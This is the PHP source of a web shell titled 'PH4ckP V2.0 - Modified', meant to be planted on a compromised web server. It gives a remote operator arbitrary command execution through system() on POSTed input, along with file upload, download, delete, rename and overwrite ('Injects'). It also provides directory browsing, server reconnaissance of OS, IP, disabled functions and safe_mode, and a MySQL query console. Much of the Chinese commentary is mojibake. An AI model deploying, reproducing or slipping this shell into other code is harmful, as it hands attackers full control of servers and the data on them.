<?php
/*--------------------------------------------
Codz By oTTo
version: V1
Last Modified :2013/11/2
----------------------------------------------
*/
//?�U��$downfile,$delfile,$refilname,$editfile 4??�q�O�D?�U���T??��?�y��?�q�A�ȱo?���O�q?Url���o���C
$downfile=$_POST["downfile"];
$delfile = $_POST["delfile"];
$refilename = $_POST["refilename"];
$editfile = $_POST["editfile"];

//���U?
if (isset($downfile)) 
        {
        #@set_time_limit(600);  #Limits the maximum execution time
        $filename = basename($downfile); #basename,filesize.readfile����?�A��??���?��ާ@����?
        header("Content-Type: application/force-download; name=".$filename); #�۳y�@?�U?http?���H���C
        header("Content-Transfer-Encoding: binary");
        header("Content-Disposition: attachment; filename=".$filename);
        header("Expires: 0");
        header("Cache-Control: no-cache, must-revalidate");
        header("Pragma: no-cache");
      }
//?�����
if(isset($delfile)&& $delfile!=""){    
        if(is_file($delfile)){     #if_file,unlink����?�A��??���?��ާ@����?
            $message = (@unlink($delfile))
              ? "<font color=blue>The deletion document succeeds!`$delfile` Already deleted!</font>"
              : "<font color=blue>The deletion document is defeated�I`$delfile` The document exists!</font>" ;
        }else{
            $message = "<font color=blue>File `$delfile` does not exist�I</font>";
        }
        echo $message;
      }

//���R�W���
if (isset($refilename)){
  echo '<table>';
  echo '<form action="" method="post">';
  echo '<br>';
  echo '<tr>';
  echo '<td align="left">';
  echo '<font size="2">';
  echo 'Enter the newname to here�G';
  echo '<input type="text" name="newname"/>';
  echo '<input type="submit" value="Rename"/>';
  echo '</tr>';echo '</td>';echo '</table>';
  $oldname=basename($refilename);               #rename����?�A��??���?��ާ@����?
  if (@rename($oldname,$_POST['newname'])){
       echo '<script>alert(\'����W���\!\')</script>';}
  else
    { if (!empty($_POST['newname']))
        echo '<script>alert(\'����W��?!\')</script>';}
}
//??���
if (isset($editfile)) {
  $content=basename($editfile);
  if(empty($_POST['newcontent'])){
    echo '<table><tr>';
    echo '<form action="" method="post">';
    echo '<input type="submit" value="Edition document"/>';
    echo '</tr>';    
    $fp=@fopen("$content","r");#fopen,fread,filesize,fclos,fwrite���t?��?�A��??���?��ާ@����?
    $data=@fread($fp,filesize($content));
    echo '<tr>';
    echo '<textarea name="newcontent" cols="80" rows="20" >';
    echo $data;
    @fclose($fp);
    echo '</textarea></tr></form></table>';
  }
   if (!empty($_POST['newcontent']))
    {
       $fp=@fopen("$content","w+");
       echo ($result=@fwrite($fp,$_POST['newcontent']))?"<font color=red>The injection document succeeds�IGood Luck!</font>":"<font color=blue>The injection document is defeated�I</font>"; 
       @fclose($fp);
    }
}

?>
<html>
<title>PH4ckP V2.0 �] By pr0cess - Modified</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312";>
<STYLE type="text/css">
body {font-family: "sans-serif", "serif"; font-size: 12px;}
BODY { background-color:#A2B5CD }
a:link {color: #BFEFFF; text-decoration: none}
a:visited {color: #080808; text-decoration: none}
a:hover {color: #FFFFFF; text-decoration: underline}
input {font-family: "sans-serif", "serif";font-size: 12px;}
td {font-family: "sans-serif", "Verdana"; font-size: 12px;}
.title {font-family: "Verdana", "Tahoma";font-size: 20px;font-weight: bold; color=black}
</STYLE>
</head>
<body>
<table width="100%"  cellspacing="1" cellpadding="3">
  <tr>
    <td class="title" align="center">PH4ckP V2.0 �] - Modified</td>
  </tr>
</table>
<hr>
<table width="100%"  cellspacing="1" cellpadding="3">
  <tr>
  <td>
  Operating system:
  <?php //php�A?��?�q 
  echo PHP_OS;?></td><td>Server name:<?echo $_SERVER['SERVER_NAME'];?><td>Server IP:<?echo gethostbyname($_SERVER['SERVER_NAME']);?></tr><tr></td><td>Server time:<?echo date("Y�~m��d�� h:i:s",time());?></td><td>Server port :<?echo $_SERVER['SERVER_PORT'];
  ?>
  </td></tr>
</table>
<hr>
<table><tr><td><a href="?shell=env">�yPHP��?��?�z</a></td><td><a href="?shell=checkdir">�y��???��?[�ֳt]�z</a></td><td> <a href="?shell=command">�y�R�O?���?�z</a></td><td><a href="?shell=sql">�y?�u?�ާ@��?�z</a></td><td><a href="?shell=change">�y�r��??��?�z</a></td></tr></table>
<hr>
<table><tr><td>Home dir:<a href="?dir=<?php echo $_SERVER['DOCUMENT_ROOT'];?>"><?php echo $_SERVER['DOCUMENT_ROOT'];?></a></td></tr><tr><td>Current dir of contents�G<?php

//���L��?���
$dir=$_GET['dir'];
if (!isset($dir) or empty($dir)) {
  $dir=str_replace('\\','/',dirname(__FILE__));
  echo "<font color=\"#00688B\">".$dir."</font>";
} else {
  
  echo "<font color=\"#00688B\">".$dir."</font>";
}
?></td>
  </tr>
<tr><td>
<form enctype="multipart/form-data" action="" method="post">
UploadFile�G
<input name="upload_file" type="file" style="font-family:Verdana,Arial; font-size: 9pt;">
<input type="submit" value="Upload~" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD">
</form>
<?php

//���W?
$upload_file=$_FILES['upload_file']['tmp_name'];
$upload_file_name=$_FILES['upload_file']['name'];
$upload_file_size=$_FILES['upload_file']['size'];

if($upload_file){
     $file_size_max = 1000*1000;
     $store_dir = dirname(__FILE__);
     $accept_overwrite = 1;  #?�w�O�_��?��??
     if ($upload_file_size > $file_size_max) {
           echo "�S�̡I??�p?�w�I�I<br>";
           exit;
          }

      if (file_exists($store_dir ."\\". $upload_file_name) && !$accept_overwrite) {
           Echo "���w�s�b�I";
           exit;
          }
      if (!move_uploaded_file($upload_file,$store_dir."\\".$upload_file_name)) {
           echo "�W?���?�I";
           exit;
       }



Echo "<p>Uploaded file:";
echo "<font color=blue>".$_FILES['upload_file']['name']."</font>";
echo "\t";

Echo "Uploadfilesiza:";
echo "<font color=blue>".$_FILES['upload_file']['size']." Bytes</font>";
echo "\t";

Echo "Sucessful..."; 

}
echo '</td></tr>';

echo '</tr>';

echo '</table>';
?>
<?php
echo '<table width="100%" border="0" cellspacing="1" cellpadding="3">';
echo '<form action="" method="get">';
  echo '<tr>';
    echo '<td>';
echo "The dir of contents glances over�G";
echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;">';
      echo '<input type="submit" value="GoTo" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD ">';
  echo '</td>';
  echo '</tr>';
echo '</form>';
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1">';
  echo '<tr>';
  echo '<td><b>';echo "Sub-Dir of contents";echo '</b></td>';
          echo '</tr>';
#���L�W?��?
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
  $b="$dir/$file";
  $a=@is_dir($b);
  if($a=="1"){
    if($file!=".."&&$file!=".")  {
         echo "<tr>\n";
         echo "  <td><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">$file</a></td>\n";
         echo "</tr>\n";
    } else {
         if($file=="..")
         echo "<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">Back higher authority dir of contents</a>";
        }
    }
}
@closedir($dirs);
?>
</table>
<hr>
<table width="100%" border="0" cellpadding="3" cellspacing="1">
          <tr>
            <td><b>Filename</b></td>
            <td><b>Filedate</b></td>
            <td><b>Filesize</b></td>
            <td><b>Fileoperates</b></td>
          </tr>

<?php
//���L���
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
  $b="$dir/$file";
  $a=@is_dir($b);
  if($a=="0"){
  $size=@filesize("$dir/$file")/1024; 
  $lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
    echo "<tr>\n";
    echo "<td>$file</td>\n";
  echo "  <td>$lastsave</td>\n";
    echo "  <td>$size KB</td>\n";
  echo "  <td><a href=\"?downfile=".urlencode($dir)."/".urlencode($file)."\">�eDown�f </a><a href=\"?delfile=".urlencode($dir)."/".urlencode ($file)."\">�eDelete�f</a></a><a href=\"?refilename=".urlencode($dir)."/".urlencode($file)."\"> �eRename�f</a><a href=\"?editfile=".urlencode($dir)."/".urlencode($file)."\">�eInjects�f </a></td>\n";
  echo "</tr>\n";
  }
}
@closedir($dirs);
?></table>
<hr>
#���L?��
<?php
if ($_GET['shell']=="env"){
     function dir_wriable($dir){
          $xY7_test=tempnam("$dir","test_file"); #???
          if ($fp=@fopen($xY7_test,"w")){
               @fclose($fp);
               @unlink($xY7_test);
               $wriable="ture";
           }
           else {
                $wriable=false or die ("Cannot open $xY7_test!");
            }
           return $wriable;
      }
     if (dir_wriable(str_replace('//','/',dirname(__FILE__)))){
             $dir_wriable='��?�i?';
             echo "<b>?�e��?�i?!^ _ ^</b>";
      }
      else{
             $dir_wriable='��?���i?';
              echo "<b>?�e��?���i?�I</b>";
       }

       function getinfo($xy7)
       {
              if($xy7==1)
                 {
                    $s='<font color=blue>YES<b>��</b></font>';
                  }
                 else
                   {
                     $s='<font color=red>NO<b>��</b></font>';
                    }
                 return $s;
                 } 
         echo '<br><br>';
         echo "�A?���t?�G" ;
         echo PHP_OS;
         echo '<br>'   ;
         echo "�A?����W:";
         echo $_SERVER['SERVER_NAME'];
         echo '<br>';
         echo "WEB�A?���ݤf�G";
         echo $_SERVER['SERVER_PORT'];
         echo '<br>';
         echo "�A?��??:";
         echo date("Y�~m��d�� h:i:s",time());
         echo '<br>';
         echo "�A?��IP�a�}:";
         echo gethostbyname($_SERVER['SERVER_NAME']);
         echo '<br>';
         echo "�A?���ާ@�t?��r??:";
         echo $_SERVER['HTTP_ACCEPT_LANGUAGE'];
         echo '<br>';
         echo "�A?����?����:";
         echo $_SERVER['SERVER_SOFTWARE'];
         echo '<br>';
         echo "PHP?��覡:";
         echo strtoupper(php_sapi_name());
         echo '<br>';
         echo "PHP����:";
         echo PHP_VERSION;
         echo '<br>';
         echo "ZEND����:";
         echo zend_version();
         echo '<br>';
         echo "�����??��?:";
         echo __FILE__;
         echo '<br>';
         echo "�A?���ѧE��?:";
         echo intval(diskfreespace(".") / (1024 * 1024)).'MB';
         echo '<br>';
         echo "?��?��i�e�̤j?�s:";
         echo get_cfg_var("memory_limit");
         echo '<br>';
         echo "?���W?���j�p����:";
         echo get_cfg_var("upload_max_filesize");
         echo '<br>';
         echo "�Q�̽���?:";
         echo get_cfg_var("disable_functions");
         echo '<br>';
         echo "POST��k���歭��:";
         echo get_cfg_var("post_max_size");
         echo '<br>';
         echo "?���W???:";
         echo get_cfg_var("max_execution_time")."��";
         echo '<br>';
         echo "???��?:";
         echo getinfo(get_cfg_var("enable_dl"));
         echo '<br>';
         echo "�۩w?����?�q:";
         echo getinfo(get_cfg_var("register_globals"));
         echo '<br>';
         echo "?��??�H��:";
         echo getinfo(get_cfg_var("display_errors"));
         echo '<br>';
         echo "PHP�w���Ҧ�:";
         echo getinfo(get_cfg_var("safe_mode"));
         echo '<br>';
         echo "FTP���??:";
         echo getinfo(get_magic_quotes_gpc("FTP support"));
         echo '<br>';
         echo"��?�ϥ�URL��?���:";
         echo getinfo(get_cfg_var("allow_url_fopen"));
         echo '<br>';
         echo "SESSION���:";
         echo getinfo(function_exists("session_start"));
         echo '<br>';
         echo "Socket���:";
         echo getinfo(function_exists("fsockopen"));
         echo '<br>';
         echo "MYSQL?�u?:";
         echo getinfo(function_exists("mysql_close"));
         echo '<br>';
         echo "SQL SERVER?�u?:";
         echo getinfo(function_exists("mssql_close"));
         echo '<br>';
         echo "ODBC?�u?:";
         echo getinfo(function_exists("odbc_close"));
         echo '<br>';
         echo "Oracle?�u?:";
         echo getinfo(function_exists("ora_close"));
         echo '<br>';
         echo "SNMP??:";
         echo getinfo(function_exists("snmpget"));
         echo '<br>';
         echo '<br>';
}
elseif ($_GET['shell']=="checkdir"){
  global $PHP_SELF;
  echo '<form action="" method="post">';
  echo "�ֳt��???:";
  echo '<input type="text" name="dir" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
  echo '<input type="submit" value="GoTo" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
  echo '<br>';
  echo '<textarea name="textarea" cols="70" rows="15">';
  if (empty($_POST['dir']))
       $newdir="./";
  else
       $newdir=$_POST['dir'];
       $handle=@opendir($newdir);
  while ($file=@readdir($handle))
    {
     echo ("$file \n");}
     echo '</textarea></form>';
}
elseif ($_GET['shell']=="command"){
echo '<table>';
echo '<form action="" method="post">';
echo '<br>';
echo '<tr>';
echo '<td align="left">';
echo 'Enter your command�G';
echo '<input type="text" name="cmd" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
echo '<input type="submit" value="Run" style="font-family:Verdana,Arial; font-size: 9pt;background-color:#A2B5CD"/>';
echo '</tr>';echo '</td>';
echo '<tr>';
echo '<td>';
echo '<textarea name="textarea" cols="70" rows="15" readonly>';
  @system($_POST['cmd']);
  echo '</textarea></form>';
}

elseif ($_GET['shell']=="change"){
echo '<form action="" method="post">';
echo '<br>';
echo "Enter binary character:";
echo '<input type="text" name="char" style="font-family:Verdana,Arial; font-size: 9pt;"/>';
echo '<input type="submit" value="Transforms to Hexadecimal" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
echo '</form>';
echo '<textarea name="textarea" cols="40" rows="1" readonly>';
$result=bin2hex($_POST['char']);
  echo "0x".$result;
  echo '</textarea>';
}

//mysql�ާ@
elseif ($_GET['shell']=="sql"){
  echo '<table align="center" cellSpacing=8 cellPadding=4>';
  echo '<tr><td>';
  echo '<form action="" method="post">';
  echo "Host:";
  echo '<input name="servername" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td><td>';
  echo "Username:";
  echo '<input name="username" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td></tr>';
  echo '<tr><td>';
  echo "Password:";
  echo '<input name="password" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td><td>';
  echo "DBname:";
  echo '<input name="dbname" type="text" style="font-family:Verdana,Arial; font-size: 9pt;">';
  echo '</td></tr>';
  $servername = $_POST['servername'];
  $username = $_POST['username'];
  $password = $_POST['password'];
  $dbname = $_POST['dbname'];

  if ($link=@mysql_connect($servername,$username,$password) and @mysql_select_db($dbname)) {
      echo "<font color=blue>The database connects successfully!</font>";
      echo "<br>";
      //mysql_close();
  } else {
      echo "<font color=red>".mysql_error()."</font>";
      echo "<br>";
  }
  $dbresult = $_POST['query'];
  if (!empty($dbresult)){
      $dbresult = @mysql_query($dbresult);
      echo ($dbresult) ? "<font color=blue>Execution successfully!</font>" : "<font color=blue>The request makes a mistake:</font> "."<font color=red>".mysql_error()."</font>";
      mysql_close();}
      echo '<tr><td>';
      echo '<textarea name="query" cols="60" rows="10">';
      echo '</textarea>';
      echo '</td></tr>';
      echo '<tr><td align="center">';
      echo '<input type="submit" value="Execution SQL_query" style="font-family:Verdana,Arial; font-size: 9pt; background-color:#A2B5CD"/>';
      echo '</td></tr>';
      echo '</table>';

}
?>
<table align="center"><tr><td>
<h6>Copyright (C) 2006 All Rights Reserved
</td></tr></table>